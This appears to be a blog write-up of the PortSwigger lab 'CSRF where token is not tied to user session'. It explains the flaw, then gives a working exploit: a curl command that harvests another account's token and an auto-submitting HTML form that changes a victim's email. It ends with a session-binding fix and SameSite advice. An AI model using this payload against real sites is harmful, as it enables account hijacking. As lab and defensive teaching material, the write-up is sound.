---
layout: post
title: "CSRF Token Not Tied to User Session"
date: 2027-06-26 09:00:00 -0500
categories: [PortSwigger, CSRF]
tags: [portswigger, csrf, cwe-352, web, practitioner, token-bypass, session-binding]
---

## Overview

PortSwigger Web Security Academy lab — *CSRF where token is not tied to user session* (Practitioner).

The app's email-change endpoint is protected by a CSRF token — sending a wrong value returns `400`. But the server stores tokens in a global pool rather than binding each token to the session that generated it. A token minted by one account is equally valid for any other account. An attacker who logs in, captures a fresh unused token, and embeds it in a cross-origin exploit page can change any victim's email without needing to know their credentials.

---

## The technique

[Cross-Site Request Forgery (CWE-352)](https://cwe.mitre.org/data/definitions/352.html) abuses the browser's automatic cookie-attachment behavior. State-changing endpoints require a session cookie for authentication — but the browser attaches cookies to any same-domain request regardless of the originating page. CSRF tokens exist to break this by proving the request was intentionally initiated from the correct page.

However, a token only provides this proof if it is **bound to the session that generated it**. A global token pool means any authenticated user can harvest a valid token and insert it into an exploit targeting a different session.

This variant is distinct from other CSRF bypass patterns:

| Probe | Result | Interpretation |
|-------|--------|---------------|
| Wrong token value | 400 | Token validation exists |
| No token parameter | 400 | Token is required (not conditional bypass) |
| Other account's unused token | 302 | Token not session-bound — this lab |

---

## Exploit

**Step 1 — Authenticate as the attacker account and harvest a fresh CSRF token**

Load the email-change form and capture the hidden CSRF token without submitting the form. The token must remain unused — tokens are single-use, so submitting it would invalidate it before the victim can consume it.

```bash
curl -s -b cookies_wiener.txt \
  'https://TARGET/my-account?id=wiener' | \
  grep -o 'name="csrf" value="[^"]*"'
# → name="csrf" value="qr5jrNL2xogdHXpamsflPdcc7gB2cN7h"
```

**Step 2 — Build the exploit page with the harvested token**

```html
<html>
  <body>
    <form action="https://TARGET/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@pwned.com">
      <input type="hidden" name="csrf" value="qr5jrNL2xogdHXpamsflPdcc7gB2cN7h">
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```

**Step 3 — Host on exploit server and deliver to victim**

```bash
curl -L 'https://exploit-server/deliver-to-victim'
```

The victim's browser loads the exploit page, auto-submits the form with their session cookie attached, and wiener's token passes server-side validation. The server changes the victim's email.

---

## Fix

Bind every CSRF token to the session that generated it. Never store tokens in a shared pool:

```js
// Generation — stored in session, not global
session.csrfToken = crypto.randomBytes(32).toString('hex');

// Validation — must match THIS session's token
if (!req.body.csrf || req.body.csrf !== req.session.csrfToken) {
  return res.status(403).send('Forbidden');
}
```

Defence-in-depth: `SameSite=Strict` session cookies prevent cross-site requests from carrying the session cookie at all, removing the attack surface regardless of token quality.

---

**Reference:** [CWE-352](https://cwe.mitre.org/data/definitions/352.html)
